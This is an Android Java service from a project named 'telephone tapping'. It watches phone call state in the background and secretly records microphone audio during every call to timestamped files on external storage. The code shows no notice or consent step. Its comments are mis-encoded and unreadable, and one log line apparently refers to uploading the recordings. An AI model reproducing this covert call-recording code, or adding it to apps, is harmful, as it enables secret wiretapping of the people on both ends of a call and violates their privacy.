package com.example.telphonetapping;

import java.io.File;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneListenerService extends Service {
	// �绰������
	private TelephonyManager tm;
	private MyListener myListener;
	// ����¼������
	private MediaRecorder mrRecorder;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		/**
		 * ��̨�����绰�ĺ���״̬
		 */
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		myListener = new MyListener();
		tm.listen(myListener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}

	/**
	 * �ڲ���ʵ�ּ����绰����״̬
	 * 
	 * @author Tiny
	 * 
	 */
	class MyListener extends PhoneStateListener {
		// �����绰�ĺ���״̬�仯
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE:// ����״̬
					if (mrRecorder != null) {
						mrRecorder.stop();
						mrRecorder.release();
						mrRecorder = null;
						System.out.println("¼����ϣ��ϴ�������");
					}
					break;
				case TelephonyManager.CALL_STATE_RINGING:// ����״̬

					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:// ͨ��״̬
					/**
					 * ¼��
					 */
					mrRecorder = new MediaRecorder();
					mrRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					mrRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					String path = new File(Environment
							.getExternalStorageDirectory(), System
							.currentTimeMillis() + ".3gp").getAbsolutePath();
					System.out.println("***************"+path);
					mrRecorder.setOutputFile(path);
					mrRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					mrRecorder.prepare();
					mrRecorder.start();
					System.out.println("����¼��");
					break;
				default:
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		// ȡ���绰����
		tm.listen(myListener, PhoneStateListener.LISTEN_NONE);
		myListener = null;
	}

}
